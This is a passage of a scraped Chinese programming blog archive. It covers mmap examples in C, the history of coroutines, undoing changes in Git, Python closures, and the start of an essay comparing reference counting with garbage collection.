&lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;error.h&gt; #define BUF_SIZE 100 int main(int argc, char **argv) { int fd, nread, i; struct stat sb; char *mapped, buf[BUF_SIZE]; for (i = 0; i &lt; BUF_SIZE; i++) { buf[i] = '#'; } /* 打开文件 */ if ((fd = open(argv[1], O_RDWR)) &lt; 0) { perror(&quot;open&quot;); } /* 获取文件的属性 */ if ((fstat(fd, &amp;sb)) == -1) { perror(&quot;fstat&quot;); } /* 私有文件映射将无法修改文件 */ if ((mapped = (char *)mmap(NULL, sb.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == (void *)-1) { perror(&quot;mmap&quot;); } /* 映射完后, 关闭文件也可以操纵内存 */ close(fd); /* 修改一个字符 */ mapped[20] = '9'; return 0; } 六、通过匿名映射实现父子进程通信1234567891011121314151617181920212223242526272829#include &lt;sys/mman.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#define BUF_SIZE 100int main(int argc, char** argv){ char *p_map; /* 匿名映射,创建一块内存供父子进程通信 */ p_map = (char *)mmap(NULL, BUF_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0); if(fork() == 0) { sleep(1); printf(&quot;child got a message: %s\\n&quot;, p_map); sprintf(p_map, &quot;%s&quot;, &quot;hi, dad, this is son&quot;); munmap(p_map, BUF_SIZE); //实际上，进程终止时，会自动解除映射。 exit(0); } sprintf(p_map, &quot;%s&quot;, &quot;hi, this is father&quot;); sleep(2); printf(&quot;parent got a message: %s\\n&quot;, p_map); return 0;} 七、对 mmap() 返回地址的访问linux 采用的是页式管理机制。对于用 mmap() 映射普通文件来说，进程会在自己的地址空间新增一块空间，空间大小由 mmap() 的 len 参数指定，注意，进程并不一定能够对全部新增空间都能进行有效访问。进程能够访问的有效地址大小取决于文件被映射部分的大小。简单的说，能够容纳文件被映射部分大小的最少页面个数决定了进程从 mmap() 返回的地址开始，能够有效访问的地址空间大小。超过这个空间大小，内核会根据超过的严重程度返回发送不同的信号给进程。可用如下图示说明： 总结一下就是，文件大小，mmap 的参数 len 都不能决定进程能访问的大小，而是容纳文件被映射部分的最小页面数决定进程能访问的大小。下面看一个实例： 1234567891011121314151617181920212223242526272829303132333435#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;int main(int argc, char** argv){ int fd,i; int pagesize,offset; char *p_map; struct stat sb; /* 取得page size */ pagesize = sysconf(_SC_PAGESIZE); printf(&quot;pagesize is %d\\n&quot;,pagesize); /* 打开文件 */ fd = open(argv[1], O_RDWR, 00777); fstat(fd, &amp;sb); printf(&quot;file size is %zd\\n&quot;, (size_t)sb.st_size); offset = 0; p_map = (char *)mmap(NULL, pagesize * 2, PROT_READ|PROT_WRITE, MAP_SHARED, fd, offset); close(fd); p_map[sb.st_size] = '9'; /* 导致总线错误 */ p_map[pagesize] = '9'; /* 导致段错误 */ munmap(p_map, pagesize * 2); return 0;} 原文地址：http://kenby.iteye.com/blog/1164700","link":"/hexo-blog/2016/09/08/mmap%20%E8%AF%A6%E8%A7%A3/"},{"title":"协程的历史，现在和未来","text":"原文地址：http://blog.youxu.info/2014/12/04/coroutine/ 本文原发于《程序员》2014年11月刊，发表时略有修改。 计算机科学是一门应用科学，几乎所有概念都是为了理解或解决实际问题而生的。协程 (Coroutine) 的出现也不例外。协程的概念，最早可以追溯到写作 COBOL 语言编译器中的技术难题。 从磁带到协程COBOL 是最早的高级语言之一。编译器则是高级语言必不可少的一部分。现如今，我们对编译器了解，已经到了可以把核心内容浓缩成一本教科书的程度。然而在六十年代，如何写作高效的语言编译器是那个时代绕不过的现实问题。比如，1960 年夏天，D. E. Knuth 就是利用开车横穿美国去加州理工读研究生的时间，对着 Burroughs 205 机器指令集手写 COBOL 编译器。最早提出“协程”概念的 Melvin Conway 的出发点，也是如何写一个只扫描一遍程序 (one-pass) 的 COBOL 编译器。众多的“高手”纷纷投入编译器书写，可见一门新科学发展之初也是筚路蓝缕 以现代眼光来看，高级语言编译器实际上是多个步骤组合而成：词法解析，语法解析，语法树构建，以及优化和目标代码生成等等。编译实质上就是从源程序出发，依次将这些步骤的输出作为下一步的输入，最终输出目标代码。在现代计算机上实现这种管道式的架构毫无困难：只需要依次运行，中间结果存为中间文件或放入内存即可。GCC 和 Clang 编译器，以及 ANTLR 构建的编译器，都遵循这样的设计。 在 Conway 的设计里，词法和语法解析不再是两个独立运行的步骤，而是交织在一起。编译器的控制流在词法和语法解析之间来回切换：当词法模块读入足够多的 token 时，控制流交给语法分析；当语法分析消化完所有 token 后，控制流交给词法分析。词法和语法分别独立维护自身的运行状态。Conway 构建的这种协同工作机制，需要参与者“让出 (yield)”控制流时，记住自身状态，以便在控制流返回时能够从上次让出的位置恢复(resume)执行。简言之，协程的全部精神就在于控制流的主动让出和恢复。我们熟悉的子过程调用可以看作在返回时让出控制流的一种特殊的协程，其内部状态在返回时被丢弃了，因此不存在“恢复”这个操作。 以现在眼光来看，编译器的实现并不必然需要协程。然而，Conway 用协程实现 COBOL 编译器在当时绝不是舍近求远。首先，从原理上来说，因为 COBOL 并不是 LL(1) 型语法，即使现在我们也无法简单构建一个以词法分析为子过程的自动机。其次，当年计算机依赖于磁带存储设备，而磁带存储设备只支持顺序存储（设想一下随机访问带来的频繁的倒带和快进问题）。也就是说，依次执行编译步骤并依靠中间文件通信的设计是不现实的，各步骤必须同步前进。正是这样的现实局限和设计需要，自然催生了协程的概念。 自顶向下，无需协同虽然协程是伴随着高级语言诞生的，它却没有能像子过程一样成为通用编程语言的基本元素。 从 1963 年首次提出到上个世纪九十年代，我们在 ALOGL, Pascal, C, FORTRAN 等主流的命令式编程语言中都没有看到原生的协程支持。协程只稀疏地出现在 Simula，Modular-2 (Pascal 升级版) 和 Smalltalk 等相对小众的语言中。协程作为一个比子进程更加通用的概念，在实际编程却没有取代子进程，这一点不得不说是出乎意外的。如果我们结合当时的程序设计思想看，这一点又是意料之中的：协程是不符合那个时代所崇尚的“自顶向下”的程序设计思想的，自然也就不会成为当时主流的命令式编程语言 (imperative programming) 的一部分。 正如面向对象的语言是围绕面向对象的开发理念设计一样，命令式编程语言是围绕自顶向下(top-down)的开发理念设计的。在自顶向下的理念指导下，程序被切分为一个主程序和大大小小的子模块，每一个子模块又可能调用更多子模块等等。C 家族语言的 main() 函数就是这种自顶而下思想的体现。在这种理念指导下，各模块形成层次调用关系，而程序设计就是制作这些子过程。在“自顶向下”这种层次化的理念下，具有鲜明层次的子过程调用成为软件系统最自然的组织方式，也是理所当然。相较之下，具有执行中让出和恢复功能的协程在这种架构下无用武之地。可以说，自上而下的设计思想从一开始就排除了对协程的需求。其后的结构化编程(Structural Programming) 思想，更是进一步强化了“子过程调用作为唯一控制结构”的基本假设。在这样的指导思想下，协程一直没有成为当时编程语言的一等公民。 尽管从提出到上世纪 90 年代，协程在编程语言中没有普遍成为一等公民，但作为一种易于理解的控制结构，协程的概念渗入到了软件设计的许多方面。在结构化编程思想一统天下之时， D. Knuth 曾经专门写过一篇 “ Structured Programming with GOTO ” 来为 GOTO 语句辩护。在他列出的几条 GOTO 可以方便编程且不破坏程序结构的例子中，有一个（例子7b）就是用 GOTO 实现协程控制结构。相比较之下，不用 GOTO 的“结构化”代码反而失去了良好的结构。当然，追求实际结果的工业界对于学界的这场要不要剔除 GOTO 的争论并不感冒。当时许多语言都附带了不建议使用的 GOTO 语句，显得左右逢源。这方面一个最明显的例子就是 Java：其语言本身预留了 goto 关键字，其编译器却没有提供任何的支持，可以说在 goto 这场争论中做足了中间派。 实践中，协程的思想频繁应用于任务调度和流处理上。比如，UNIX 管道就可以看成是众多命令间的协同操作。当然，管道的现代实现都是以 pipe() 系统调用和进程间的通信为基础，而非简单遵循协程的 yield/resume 语法。 许多协同式多任务操作系统，也可以看成协程运行系统。说到协同式多任务系统，一个常见的误区是认为协同式调度比抢占式调度“低级”，因为我们所熟悉的桌面操作系统，都是从协同式调度（如 Windows 3.2， Mac OS 9 等）过渡到抢占式多任务系统的。实际上，调度方式并无高下，完全取决于应用场景。抢占式系统允许操作系统剥夺进程执行权限，抢占控制流，因而天然适合服务器和图形操作系统，因为调度器可以优先保证对用户交互和网络事件的快速响应。当年 Windows 95 刚刚推出的时候，抢占式多任务就被作为一大买点大加宣传。协同式调度则等到进程时间片用完或系统调用时转移执行权限，因此适合实时或分时等等对运行时间有保障的系统。 另外，抢占式系统依赖于 CPU 的硬件支持。 因为调度器需要“剥夺”进程的执行权，就意味着调度器需要运行在比普通进程高的权限上，否则任何“流氓（rogue）”进程都可以去剥夺其他进程了。只有 CPU 支持了执行权限后，抢占式调度才成为可能。x86 系统从 80386 处理器开始引入 Ring 机制支持执行权限，这也是为何 Windows 95 和 Linux 其实只能运行在 80386 之后的 x86 处理器上的原因。而协同式多任务适用于那些没有处理器权限支持的场景，这些场景包含资源受限的嵌入式系统和实时系统。在这些系统中，程序均以协程的方式运行。调度器负责控制流的让出和恢复。通过协程的模型，无需硬件支持，我们就可以在一个“简陋”的处理器上实现一个多任务的系统。我们见到的许多智能设备，如运动手环，基于硬件限制，都是采用协同调度的架构。 协程的复兴和现代形式编程思想能否普及开来，很大程度上在于应用场景。协程没有能在自顶向下的世界里立足，却在动态语言世界里大放光彩，这里最显著的例子莫过于 Python 的迭代器和生成器。 回想一下在 C 的世界里，循环的标准写法是 for (i = 0; i &lt; n; ++i) { … }。 这行代码包含两个独立的逻辑, for 循环控制了 i 的边界条件， ++i 控制了 i 的自增逻辑。这行代码适用于 C 世界里的数组即内存位移的范式，因此适合大多数访问场景。到了 STL 和复杂数据结构的世界，因为许多数据结构只支持顺序访问，循环往往写成：for (i = A.first(); i.hasNext();i = i.next()) { … } 这种设计抽象出了一个独立于数据结构的迭代器，专门负责数据结构上元素访问顺序。迭代器把访问逻辑从数据结构上分离出来, 是一个常用的设计模式 （GoF 23个设计模式之一）.我们在 STL 和 Java Collection 中也常常看到迭代器的身影。 在适当的时候，我们可以更进一步引入一个语法糖（脚注：这里牵涉到一个外部迭代器和内部迭代器的问题。限于篇幅不在此讨论）将循环写成: for i in A.Iterator() {func(i)}。 事实上，许多现代语言都支持类似的语法。这种语法抛弃了以 i 变量作为迭代指针的功能，要求迭代器自身能够记住当前迭代位置，调用时返回下一个元素。读者不难看到，这种架构就是我们在文章开始提到的语法分析器的架构。正因为如此，我们可以从协程的角度来理解迭代器：当控制流转换到迭代器上时，迭代器负责生成和返回下一个元素。一旦下一个元素准备就绪，迭代器就让出控制流。这种特殊的迭代器实现在 Python 中又被成为生成器。以协程的角度切入的的好处是设计大大精简。实际上，在 Python 中，生成器本身就是一个普通的函数，和普通函数的唯一不同是它的返回语句是协程风格的 yield。这里，yield 一语双关，既是让出控制流，也是生成迭代器的返回值。 以上我们仅仅讨论了生成器的最基本的特性。实际上，生成器的强大之处在于我们可以像 UNIX 管道一样串联起来，组成所谓的生成器表达式。如果我们有一个可以生成 1，2，3 … 的生成器 N，则 square = (i \\*\\*2 for i in N) 就是一个生成平方数的生成器表达式。注意这里圆括号语法和 list comprehension 方括号语法的区别，square = [i \\*\\*2 for i in N] 是生成一个具体的列表。我们可以串联这些生成器表达式，最终的控制流会在这些串联的部分间转换，无需我们写作复杂的嵌套调用。当然，yield 只是冰山的一角，现代的 Python 语言还充分利用了 yield 关键字构建了 yield from 语句，(yield) 语法等等，使得我们无困难的将协程的思想融入到 Python 编程中去。限于篇幅这里不再展开。 我们前面说过，协程的思想本质上就是控制流的主动让出和恢复机制。在现代语言里，可以实现协程思想的方法很多，这些实现间并无高下之分，所区别的就是是否适合应用场景。理解这一点，我们对于各种协程的分类，如半对称/对称协程，有栈与无栈协程等具体实现就能提纲挈领，无需在实现细节上纠结。 协程在实践中的实现方式千差万别，一个简单的原因，是协程本身可以通过许多基本元素构建。基本元素的选取方式不一样，构建出来的协程抽象也就有差别。比如, Lua 语言选取了 create, resume 和 yield 作为基本构建元素, 从调度器层面构建出所谓的“非对程”协程系统。而 Julia 语言绕过调度器，通过在协程内调用 yieldto 函数完成了同样的功能，构建出了一个所谓的对称协程系统。尽管这两个语言使用了同样的 setjmp 库，构造出来的原语却不一样。又比如，许多 C 语言的协程库都使用了 ucontext 库实现，这是因为 POSIX 本身提供了 ucontext 库，不少协程实现是以 ucontext 为蓝本实现的。这些实现，都不可避免地带上了 ucontext 系统的一些基本假设，比如协程间是平等的，一般带有调度器来协调协程等等（比如 libtask 实现，以及 云风的 coroutine 库 ）。Go 语言的一个鲜明特色就是通道（channel）作为一级对象。因此，resume 和 yield 等在其他语言里的原语在 go 里都以通道方式构建。我们还可以举出许多同样的例子。这些风格的差异往往和语言的历史，演化路径，和要解决的问题相关，我们不必苛求他们的协程模型一定要如此这般。 总的来说，协程为协同任务提供了一种运行时抽象。这种抽象非常适合于协同多任务调度和数据流处理。在现代操作系统和编程语言中，因为用户态线程切换代价比内核态线程小，协程成为了一种轻量级的多任务模型。我们无法预测未来，但是可以看到，协程已经成为许多擅长数据处理的语言的一级对象。随着计算机并行性能的提升，用户态任务调度已经成为一种标准的多任务模型。在这样的大趋势下，协程这个简单且有效的模型就显得更加引人注目。","link":"/hexo-blog/2016/09/08/%E5%8D%8F%E7%A8%8B%E7%9A%84%E5%8E%86%E5%8F%B2%EF%BC%8C%E7%8E%B0%E5%9C%A8%E5%92%8C%E6%9C%AA%E6%9D%A5/"},{"title":"如何在 Git 里撤销（几乎）任何操作","text":"任何版本控制系统的一个最有的用特性就是“撤销 (undo)”你的错误操作的能力。在 Git 里，“撤销” 蕴含了不少略有差别的功能。 当你进行一次新的提交的时候，Git 会保存你代码库在那个特定时间点的快照；之后，你可以利用 Git 返回到你的项目的一个早期版本。 在本篇博文里，我会讲解某些你需要“撤销”已做出的修改的常见场景，以及利用 Git 进行这些操作的最佳方法。 撤销一个“已公开”的改变场景： 你已经执行了 git push, 把你的修改发送到了 GitHub，现在你意识到这些 commit 的其中一个是有问题的，你需要撤销那一个 commit. 方法： git revert &lt;SHA&gt; 原理： git revert 会产生一个新的 commit，它和指定 SHA 对应的 commit 是相反的（或者说是反转的）。如果原先的 commit 是“物质”，新的 commit 就是“反物质” — 任何从原先的 commit 里删除的内容会在新的 commit 里被加回去，任何在原先的 commit 里加入的内容会在新的 commit 里被删除。 这是 Git 最安全、最基本的撤销场景，因为它并不会改变历史 — 所以你现在可以 git push 新的“反转” commit 来抵消你错误提交的 commit。 修正最后一个 commit 消息场景： 你在最后一条 commit 消息里有个笔误，已经执行了 git commit -m &quot;Fxies bug #42&quot;，但在 git push 之前你意识到消息应该是 &quot;Fixes bug #42&quot;。 方法： git commit --amend 或 git commit --amend -m &quot;Fixes bug #42&quot; 原理： git commit --amend 会用一个新的 commit 更新并替换最近的 commit ，这个新的 commit 会把任何修改内容和上一个 commit 的内容结合起来。如果当前没有提出任何修改，这个操作就只会把上次的 commit 消息重写一遍。 撤销“本地的”修改场景： 一只猫从键盘上走过，无意中保存了修改，然后破坏了编辑器。不过，你还没有 commit 这些修改。你想要恢复被修改文件里的所有内容 — 就像上次 commit 的时候一模一样。 方法： git checkout -- &lt;bad filename&gt; 原理： git checkout 会把工作目录里的文件修改到 Git 之前记录的某个状态。你可以提供一个你想返回的分支名或特定 SHA ，或者在缺省情况下，Git 会认为你希望 checkout 的是 HEAD，当前 checkout 分支的最后一次 commit。 记住： 你用这种方法“撤销”的任何修改真的会完全消失。因为它们从来没有被提交过，所以之后 Git 也无法帮助我们恢复它们。你要确保自己了解你在这个操作里扔掉的东西是什么！（也许可以先利用 git diff 确认一下） 重置“本地的”修改场景： 你在本地提交了一些东西（还没有 push），但是所有这些东西都很糟糕，你希望撤销前面的三次提交 — 就像它们从来没有发生过一样。 方法： git reset &lt;last good SHA&gt; 或 git reset --hard &lt;last good SHA&gt; 原理： git reset 会把你的代码库历史返回到指定的 SHA 状态。 这样就像是这些提交从来没有发生过。缺省情况下，git reset 会保留工作目录。这样，提交是没有了，但是修改内容还在磁盘上。这是一种安全的选择，但通常我们会希望一步就“撤销”提交以及修改内容 — 这就是 --hard 选项的功能。 在撤销“本地修改”之后再恢复场景： 你提交了几个 commit，然后用 git reset --hard 撤销了这些修改（见上一段），接着你又意识到：你希望还原这些修改！ 方法： git reflog 和 git reset 或 git checkout 原理： git reflog 对于恢复项目历史是一个超棒的资源。你可以恢复几乎 任何东西 — 任何你 commit 过的东西 — 只要通过 reflog。 你可能已经熟悉了 git log 命令，它会显示 commit 的列表。git reflog 也是类似的，不过它显示的是一个 HEAD 发生改变的时间列表. 一些注意事项： 它涉及的只是 HEAD 的改变。在你切换分支、用 git commit 进行提交、以及用 git reset 撤销 commit 时，HEAD 会改变，但当你用 git checkout -- &lt;bad filename&gt; 撤销时（正如我们在前面讲到的情况），HEAD 并不会改变 — 如前所述，这些修改从来没有被提交过，因此 reflog 也无法帮助我们恢复它们。 git reflog 不会永远保持。Git 会定期清理那些 “用不到的” 对象。不要指望几个月前的提交还一直躺在那里。 你的 reflog 就是你的，只是你的。你不能用 git reflog 来恢复另一个开发者没有 push 过的 commit。 那么…你怎么利用 reflog 来“恢复”之前“撤销”的 commit 呢？它取决于你想做到的到底是什么： 如果你希望准确地恢复项目的历史到某个时间点，用 git reset --hard &lt;SHA&gt; 如果你希望重建工作目录里的一个或多个文件，让它们恢复到某个时间点的状态，用 git checkout &lt;SHA&gt; -- &lt;filename&gt; 如果你希望把这些 commit 里的某一个重新提交到你的代码库里，用 git cherry-pick &lt;SHA&gt; 利用分支的另一种做法场景： 你进行了一些提交，然后意识到你开始 check out 的是 master 分支。你希望这些提交进到另一个特性（feature）分支里。 方法： git branch feature, git reset --hard origin/master, and git checkout feature 原理： 你可能习惯了用 git checkout -b &lt;name&gt; 创建新的分支 — 这是创建新分支并马上 check out 的流行捷径 — 但是你不希望马上切换分支。这里， git branch feature 创建一个叫做 feature 的新分支并指向你最近的 commit，但还是让你 check out 在 master 分支上。 下一步，在提交任何新的 commit 之前，用 git reset --hard 把 master 分支倒回 origin/master 。不过别担心，那些 commit 还在 feature 分支里。 最后，用 git checkout 切换到新的 feature 分支，并且让你最近所有的工作成果都完好无损。 及时分支，省去繁琐场景： 你在 master 分支的基础上创建了 feature 分支，但 master 分支已经滞后于 origin/master 很多。现在 master 分支已经和 origin/master 同步，你希望在 feature 上的提交是从现在开始，而不是也从滞后很多的地方开始。 方法： git checkout feature 和 git rebase master 原理： 要达到这个效果，你本来可以通过 git reset (不加 --hard, 这样可以在磁盘上保留修改) 和 git checkout -b &lt;new branch name&gt; 然后再重新提交修改，不过这样做的话，你就会失去提交历史。我们有更好的办法。 git rebase master 会做如下的事情： 首先它会找到你当前 check out 的分支和 master 分支的共同祖先。 然后它 reset 当前 check out 的分支到那个共同祖先，在一个临时保存区存放所有之前的提交。 然后它把当前 check out 的分支提到 master 的末尾部分，并从临时保存区重新把存放的 commit 提交到 master 分支的最后一个 commit 之后。 大量的撤销/恢复场景： 你向某个方向开始实现一个特性，但是半路你意识到另一个方案更好。你已经进行了十几次提交，但你现在只需要其中的一部分。你希望其他不需要的提交统统消失。 方法： git rebase -i &lt;earlier SHA&gt; 原理： -i 参数让 rebase 进入“交互模式”。它开始类似于前面讨论的 rebase，但在重新进行任何提交之前，它会暂停下来并允许你详细地修改每个提交。 rebase -i 会打开你的缺省文本编辑器，里面列出候选的提交。如下所示： 前面两列是键：第一个是选定的命令，对应第二列里的 SHA 确定的 commit。缺省情况下， rebase -i 假定每个 commit 都要通过 pick 命令被运用。 要丢弃一个 commit，只要在编辑器里删除那一行就行了。如果你不再需要项目里的那几个错误的提交，你可以删除上例中的1、3、4行。 如果你需要保留 commit 的内容，而是对 commit 消息进行编辑，你可以使用 reword 命令。 把第一列里的 pick 替换为 reword (或者直接用 r)。有人会觉得在这里直接重写 commit 消息就行了，但是这样不管用 rebase -i 会忽略 SHA 列前面的任何东西。它后面的文本只是用来帮助我们记住 0835fe2 是干啥的。当你完成 rebase -i 的操作之后，你会被提示输入需要编写的任何 commit 消息。 如果你需要把两个 commit 合并到一起，你可以使用 squash 或 fixup 命令，如下所示： squash 和 fixup 会“向上”合并 — 带有这两个命令的 commit 会被合并到它的前一个 commit 里。在这个例子里， 0835fe2 和 6943e85 会被合并成一个 commit， 38f5e4e 和 af67f82 会被合并成另一个。 如果你选择了 squash， Git 会提示我们给新合并的 commit 一个新的 commit 消息； fixup 则会把合并清单里第一个 commit 的消息直接给新合并的 commit 。 这里，你知道 af67f82 是一个“完了完了….” 的 commit，所以你会留着 38f5e4e as的 commit 消息，但你会给合并了 0835fe2 和 6943e85 的新 commit 编写一个新的消息。 在你保存并退出编辑器的时候，Git 会按从顶部到底部的顺序运用你的 commit。你可以通过在保存前修改 commit 顺序来改变运用的顺序。如果你愿意，你也可以通过如下安排把 af67f82 和 0835fe2 合并到一起： 修复更早期的 commit场景： 你在一个更早期的 commit 里忘记了加入一个文件，如果更早的 commit 能包含这个忘记的文件就太棒了。你还没有 push，但这个 commit 不是最近的，所以你没法用 commit --amend. 方法： git commit --squash &lt;SHA of the earlier commit&gt; 和 git rebase --autosquash -i &lt;even earlier SHA&gt; 原理： git commit --squash 会创建一个新的 commit ，它带有一个 commit 消息，类似于 squash! Earlier commit。 (你也可以手工创建一个带有类似 commit 消息的 commit，但是 commit --squash 可以帮你省下输入的工作。) 如果你不想被提示为新合并的 commit 输入一条新的 commit 消息，你也可以利用 git commit --fixup 。在这个情况下，你很可能会用 commit --fixup ，因为你只是希望在 rebase 的时候使用早期 commit 的 commit 消息。 rebase --autosquash -i 会激活一个交互式的 rebase 编辑器，但是编辑器打开的时候，在 commit 清单里任何 squash 和 fixup 的 commit 都已经配对到目标 commit 上了，如下所示： 在使用 --squash 和 --fixup 的时候，你可能不记得想要修正的 commit 的 SHA 了— 只记得它是前面第 1 个或第 5 个 commit。你会发现 Git 的 ^ 和 ~ 操作符特别好用。HEAD^ 是 HEAD 的前一个 commit。 HEAD~4 是 HEAD 往前第 4 个 – 或者一起算，倒数第 5 个 commit。 停止追踪一个文件场景： 你偶然把 application.log 加到代码库里了，现在每次你运行应用，Git 都会报告在 application.log 里有未提交的修改。你把 *.login 放到了 .gitignore 文件里，可文件还是在代码库里 — 你怎么才能告诉 Git “撤销” 对这个文件的追踪呢？ 方法： git rm --cached application.log 原理： 虽然 .gitignore 会阻止 Git 追踪文件的修改，甚至不关注文件是否存在，但这只是针对那些以前从来没有追踪过的文件。一旦有个文件被加入并提交了，Git 就会持续关注该文件的改变。类似地，如果你利用 git add -f 来强制或覆盖了 .gitignore， Git 还会持续追踪改变的情况。之后你就不必用 -f 来添加这个文件了。 如果你希望从 Git 的追踪对象中删除那个本应忽略的文件， git rm --cached 会从追踪对象中删除它，但让文件在磁盘上保持原封不动。因为现在它已经被忽略了，你在 git status 里就不会再看见这个文件，也不会再偶然提交该文件的修改了。 这就是如何在 Git 里撤销任何操作的方法。要了解更多关于本文中用到的 Git 命令，请查看下面的有关文档： checkout commit rebase reflog reset revert rm 原文地址：https://github.com/blog/2019-how-to-undo-almost-anything-with-git译文地址：http://blog.jobbole.com/87700/","link":"/hexo-blog/2016/09/08/%E5%A6%82%E4%BD%95%E5%9C%A8%20Git%20%E9%87%8C%E6%92%A4%E9%94%80%EF%BC%88%E5%87%A0%E4%B9%8E%EF%BC%89%E4%BB%BB%E4%BD%95%E6%93%8D%E4%BD%9C/"},{"title":"浅显理解 Python 闭包","text":"闭包这个概念在 JavaScript 中讨论和使用得比较多，不过在 Python 中却不是那么显而易见，之所以说“不是那么”，是因为即使用到了，也没用注意到而已，比如定义一个 Decorator 时，就已经用到闭包了。网上对闭包的各种解释，感觉非常晦涩，在这里谈谈我的浅显认识：要形成闭包，首先得有一个嵌套的函数，即函数中定义了另一个函数，闭包则是一个集合，它包括了外部函数的局部变量，这些局部变量在外部函数返回后也继续存在，并能被内部函数引用。 举个例子这是个经常使用到的例子，定义一个函数 generate_power_func，它返回另一个函数，现在闭包形成的条件已经达到。 123456def generate_power_func(n): print &quot;id(n): %X&quot; % id(n) def nth_power(x): return x**n print &quot;id(nth_power): %X&quot; % id(nth_power) return nth_power 对于内部函数 nth_power，它能引用到外部函数的局部变量 n，而且即使 generate_power_func 已经返回。把这种现象就称为闭包。具体使用一下。 12345&gt;&gt;&gt; raised_to_4 = generate_power_func(4)id(n): 246F770id(nth_power): 2C090C8&gt;&gt;&gt; repr(raised_to_4)'&lt;function nth_power at 0x2c090c8&gt;' 从结果可以看出，当 generate_power_func(4) 执行后, 创建和返回了 nth_power 这个函数对象，内存地址是 0x2C090C8,并且发现 raised_to_4 和它的内存地址相同，即 raised_to_4 只是这个函数对象的一个引用。先在全局命名空间中删除 generate_power_func，再试试会出现什么结果。 123&gt;&gt;&gt; del generate_power_func&gt;&gt;&gt; raised_to_4(2)16 啊哈，居然没出现错误， nth_power 是怎么知道 n 的值是 4，而且现在 generate_power_func 甚至都不在这个命名空间了。对，这就是闭包的作用，外部函数的局部变量可以被内部函数引用，即使外部函数已经返回了。 closure 属性和 cell 对象现在知道闭包是怎么一回事了，那就到看看闭包到底是怎么回事的时候了。Python 中函数也是对象，所以函数也有很多属性，和闭包相关的就是 __closure__ 属性。__closure__ 属性定义的是一个包含 cell 对象的元组，其中元组中的每一个 cell 对象用来保存作用域中变量的值。 123456&gt;&gt;&gt; raised_to_4.__closure__(&lt;cell at 0x2bf4ec0: int object at 0x246f770&gt;,)&gt;&gt;&gt; type(raised_to_4.__closure__[0])&lt;type 'cell'&gt;&gt;&gt;&gt; raised_to_4.__closure__[0].cell_contents4 就如刚才所说，在 raised_to_4 的 __closure__ 属性中有外部函数变量 n 的引用，通过内存地址可以发现，引用的都是同一个 n。如果没用形成闭包，则 __closure__ 属性为 None。对于 Python 具体是如何实现闭包的，可以查看 Python闭包详解，它通过分析 Python 字节码来讲述闭包的实现。 最后总结闭包特性有着非常多的作用，不过都是需要时才会不经意的用上，不要像使用设计模式一样去硬套这些法则。这篇文章按照自己的理解翻译至 Python Closures Explained，可能和原文有些不同之处，如有疑惑，请查看原文。附上一些参考资料。 闭包的概念、形式与应用: 可以从其中了解闭包的应用 Python闭包详解：从字节码出发了解 Python 闭包的实现机制 理解Javascript的闭包: 从 Javascript 的闭包中了解一些闭包特性，可以和 Python 作下对比 原文地址：https://serholiu.com/python-closures","link":"/hexo-blog/2016/09/08/%E6%B5%85%E6%98%BE%E7%90%86%E8%A7%A3%20Python%20%E9%97%AD%E5%8C%85/"},{"title":"引用计数与垃圾收集之比较","text":"原文地址：http://blog.codingnow.com/2008/06/gc.html 本质上来说，引用计数策略和垃圾收集策略都属于资源的自动化管理。所谓自动化管理，就是在逻辑层不知道资源在什么时候被释放掉，而依赖底层库来维持资源的生命期。 而手工管理，则是可以准确的知道资源的生命期，在准确的位置回收它。在 C++ 中，体现在析构函数中写明 delete 用到的资源，并由编译器自动生成的代码析构基类和成员变量。 所以，为 C++ 写一个垃圾收集器，并不和手工管理资源冲突。自动化管理几乎在所有有点规模的 C++ 工程中都在使用，只不过用的是引用计数的策略而非垃圾收集而已。也就是说，我们使用 C++ 或 C 长期以来就是结合了手工管理和自动管理在构建系统了。无论用引用计数，还是用垃圾收集，软件实现的细节上，该手工管理的地方我们依旧可以手工管理。 为什么要用资源生命期自动管理？ 让我们来看面向对象，如果一切皆对象，每个对象的生命期就应该由自己负责，我们是可以直接准确的死亡时间的。可惜，有很多东西不是纯粹的对象。最重要的一个就是对象容器。它们除了自身的属性，还保持了对一组同类对象的引用。 一个对象可以分别被几个容器引用，这使得容器区别于猫猫狗狗这些对象实体。因为容器引用一个东西不等于这个东西是这个容器的一部分（有时候可以，有时候不行）。当我们把希望整个世界分成一个个对象时，所有的原子被分到各层的对象上后，就会发现有零零总总的概念无法用对象提取。引用而非拥有，这是无法回避的。 面向对象的本质在于，对许多对象提取出共性放在一起处理。这样，各式容器的使用就是无可避免的了。 也正是如此，对象自己并不知道自己是否已经可以宣告死亡。除非了解自己和别的对象的联系（这种关系不是对象）。资源可以是对象，而自动化管理正是管理的这些对象和对象之间的关系。 引用计数就是最容易实现的一种方案：记录对象被引用的次数，而不具体记录是谁引用了它。这样，降低了建立和解除引用的代价。但是，有得必有失。在引用计数的过程中，我们也丢失了重要的信息：到底是谁引用了自己。所以，引用计数在处理间接引用的问题上代价增加。 对象死亡的判定是：对象和这个世界还有没有联系，无论是直接的还是间接的。所以，一个对象即使还有另外的对象直接引用它，它也可能已经脱离了世界。为了解决这个问题，使用引用计数的系统，必须在对象和世界脱离联系时，通知和它有关联的对象。对象的销毁代价增加，就是引用计数策略的短板。 对象的销毁频率，取决于对象的平均生存时间。而对象的生存时间，一方面受对象粒度的影响，往往对象粒度越细，对象平均生存时间越短（虽然表面上没有直接联系，但是实际设计时往往会导致这个结果）；另一方面，我们往往会把容器和引用关系也实现成一种对象（概念上本不应该是对象）。比如说许多自动维持引用计数的智能指针就是一个小容器，里面保持了对一个对象唯一的引用，它就被实现成一个小对象。 通常，对象本身的性质并不随自己在内存空间中的位置改变而改变。但是引用关系（通常用指针来实现）却和内存地址相关。C++ 缺乏一种对象在内存中移动的语义表达，等价物是，在新的内存块中拷贝构造一个新对象，并销毁原有的。 另一方面，程序的运行序中，函数调用造成的堆栈上的嵌套作用域也可以看成一个个容器，机器指令穿行于这些作用域间，临时构造出的对对象的引用（智能指针），就被放置于这些作用域内。函数调用越频繁，这些作用域的创建和销毁也就越频繁。 这些导致了 C++ 必须依赖大量的 inline 函数，让编译器了解更多的上下文信息，方能减轻小对象（智能指针）创建销毁的负担。 STL 